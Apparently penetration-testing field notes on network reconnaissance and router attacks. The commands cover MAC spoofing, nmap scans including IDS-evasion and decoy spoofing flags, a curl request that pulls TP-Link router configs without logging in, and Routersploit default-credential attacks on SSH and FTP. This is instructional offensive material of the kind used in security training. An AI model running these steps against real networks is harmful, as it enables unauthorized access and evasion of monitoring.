Network Reconnaissance
----------------------
Cyber Kill Chain
  (We live in this area with what we do)
  Recon - Harvesting emails, confererence information
  Weaponization - Coupling exploit with backdoor into deliverable payload
  Delivery
  Exploitation
  Installation 
  Command and Control
  Actions on Objectives

Before we attempt to exploit a network, we need to know as much as we can about it.
  Open ports
  Services/Versions
  ISP
  Hops
  IP Addresses
  Operating systems
  Router Configuration / Browser Accessibility

Remote Authentication
--------
We will use wpa_supplicant to connect to our target network
--
ps -ef | grep wpa_supplicant (find and kill unwanted process)
sudo ifconfig <interface> down
sudo macchanger -r <interface>
sudo ifconfig <interface> up

Assign WPA supplicant to your Alfa card:
--
sudo wpa_supplicant -c /etc/wpa_supplicant/<wpa_supplicant.conf> -i <interface> -B

Who conducts Network Recon?
--
Depending on your partner, it might be you!

Some partners will request your support to e remote bridged onto a network
This will require you to get close accesss and have them tunnel through your network.

NMAP
----
"Network Mapper" is a free and open-source utility for network discovery and security auditing.

sudo apt install nmap

This is probably the fastest nmap when you don't have any time on target, but it doesn't give us much info. It will give us what hosts are up only
nmap <IP/24> -sn -V | tee <FILENAME>

This nmap is a siple host scan to identify what hosts are up and talking and also what common ports are open
nmap <IP/24> -T4 -vv | tee <FILENAME>

T4 is telling nmap to run faster and assumes you have a good connection to the network, default nmap is T3

OS detection and TCP/IP fingerprinting
Notice this exmpla is for a specifci IP
sudo nmap <IP/24> -O -vv | tee <FILENAME>

F will scan the 100 most popular ports. This is a good port scan when you need to scan the whole range but only have a small amount of time.

nmap <IP/24> -F -vv | tee <FILENAME>

Enable OS Detection and version detection
If you run -A on a whole IP range, it can take awhile

nmap <IP> -A -vv -oA <SSID> | tee <FILENAME>

nmap script engine:
nmap comes with various scripts that expand the enumeration of networks
Located:
  /usr/share/nmap/scripts

You can learn more about these scripts by running the --script-help command

You can also add third-party engines to nmap.

cd /usr/share/nmap/scripts
git clone https://github.com/scipag/vulscan.git

nmap -sV --script=vulscan/vulscan.nse 192.168.0.1

nmap -sV --script=vul* <IP> (takes forever, runs every vul script)
nmap -sV --script=http* <IP> (takes forever, runs every http script)

Enumerating http

go to webpage, right-click and show source code. Look for any version information, credentials, etc
nmap <IP> -sV --script=http*

Nikto
Nikto is an open-source web server and web application scanner
nikto can perform comprehensive tests against web server for security threats

sudo apt install nikto
nikto -h <IP>

Enum4linux-ng is a tool for enumerating information from windows and samba systems
installation:
  cd /opt
  sudo apt install smbclient python3-ldap3 python3-yaml python3-impacket
  sudo git clone https://github.com/cddmp/enum4linux-ng.git
  cd enum4linux-ng
  pip3 install -r requirements.txt

Avoiding IDS
--
Firewalls and Intrusion Detection Systems seek to avoid malicious traffic from entering the network, but certain techniques can be used to evade IDS/firewalls

Fragmenting Packets
Source Port Manipulation
IP Address Spoofing
Custom Packets

nmap -f (fragments) --mtu (max transmissable units) --source-port (uses specified port) -D RND:12 (random IP Address spoofing) -S (specified IP address spoofing) --data 0xdeadbeef (custom packets through firewall) --data-length (additional data to the scan)

Traceroute
--
sudo apt install traceroute

traceroute -i <interface> <IP/domain>

First non-private IP is most likely the public facing IP

Install the SimpleScreenRecorder program and record your entire session
install the Screenshot program to take 'snips' of info

If you attempt to get on the router during network recon phase, get the following information:
  Firmware Version
  Hardware Version
  System logs
  DNS settings
  WPS pin, if applicable
  5GHz side SSID and PW, if applicable

Bypassing router login
--------------------
Ubunutu 20.04 and raspbian buster
sudo apt install python3-crypto

download the tpconf_bin_xml.py from flashdrive and run it against the file
pip3 install pycryptodome

The more you understand your target, the better the chance identifying a vulnerability. As an example, many TP-Link routers have a vulnerability that allows you to pull the router configuration without logging into the router:
curl -s -k -X GET -H "Referer:http://<IP>/mainFrame.htm" http://<IP>/cgi/conf.bin > conf.bin
python3 tpconf_bin_xml.py conf.bin conf.xml

Port binding (remote)
------
Create a new firefox profile for proxy settings
In the browser URL bar type about:profiles

In order to forward the port 80 traffic from the raspberrypi to our laptops we must execute ssh with the -D argument and random high port number

ssh -D 21212 pi@<IP>

Whatever your random high port is, we will set up our FIREFOX browser to serve as a http proxy
(Network setting, manual proxy)

Routersploit
-------------------
sudo apt-get install git python3-pip

git clone https://github.com/threat9/routersploit

cd routersploit

python3 -m pip install -r requirements.txt

python3 rsf.py

Scanners
----
First, check which scanners are installed:
--
search scanner

To use a scanner, select it and set options
--
use scanners/routers/router_scan OR use scanners/dlink_scan

show options
--
set target <IP> 
run


Target SSH
----
search tplink
use creds/routers/tplink/ssh_default_creds
show options
set target <IP>
run


Target FTP
----
use creds/routers/linksys/ftp_default_creds
show options
set target <IP>
set defaults file: /opt/rockyou.txt
run
